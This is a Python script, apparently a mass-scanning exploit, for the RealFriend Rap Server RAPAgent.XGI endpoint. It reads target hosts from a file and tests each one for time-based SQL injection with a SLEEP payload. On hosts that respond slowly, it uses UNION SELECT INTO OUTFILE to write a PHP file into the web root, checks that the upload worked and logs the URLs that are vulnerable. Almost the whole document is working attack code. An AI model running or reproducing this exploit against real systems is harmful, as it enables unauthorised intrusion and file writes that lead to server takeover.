import requests
import time
file=open('url.txt','r')
for host in file:
    print(host)
    host=host.replace('\n','')
    # host='http://59.41.185.162:8888/'
    for i in range(1,5):
        start_time=time.time()
        url=host+'/RAPAgent.XGI?CMD=GETApplication&AppID=APP0000000'+str(i)+'&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=CMD=GETApplication&AppID=APP00000001&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP(10)))Joqo)%20AND%20%27DseX%27=%27DseX&Finger=A45A2E5E3&IP=&Finger=A45A2E5E3&IP='
        try: 
            result=requests.get(url,verify=False).text
            end_time=time.time()
            response_time=end_time-start_time
            if int(response_time) >= 7:
                print("存在延时注入,进行文件上传")
                with open('sql_payload.txt','a')as f:
                    f.write(url+'\n')
                print('Payload:'+url)
                url=host+'/RAPAgent.XGI?CMD=GETApplication&AppID=APP0000000'+str(i)+'&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27C:/Program+Files+(x86)/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&Finger=A45A2E5E3&IP='
                result=requests.get(url,verify=False)
                url=host+'/RAPAgent.XGI?CMD=GETApplication&AppID=APP0000000'+str(i)+'&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27D:/Program+Files+(x86)/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&Finger=A45A2E5E3&IP='
                result=requests.get(url,verify=False)
                url=host+'/RAPAgent.XGI?CMD=GETApplication&AppID=APP0000000'+str(i)+'&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27C:/Program+Files/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&Finger=A45A2E5E3&IP='
                result=requests.get(url,verify=False)
                url=host+'/RAPAgent.XGI?CMD=GETApplication&AppID=APP0000000'+str(i)+'&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27D:/Program+Files/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&Finger=A45A2E5E3&IP='
                result=requests.get(url,verify=False)
                url=host+'/custom/InfoPage1.files/poctest.php'    
                result=requests.get(url,verify=False).text
                if result.find('phpinfo')!=-1:
                    print(url+'-文件上传成功')
                    with open('phpinfo_url.txt','a')as f:
                        f.write(url+'\n')
                else:
                    print('文件上传失败')

                break
            else:
                print("注入不存在")
        except Exception as e:
            print('错误请求')
            break
file.close()





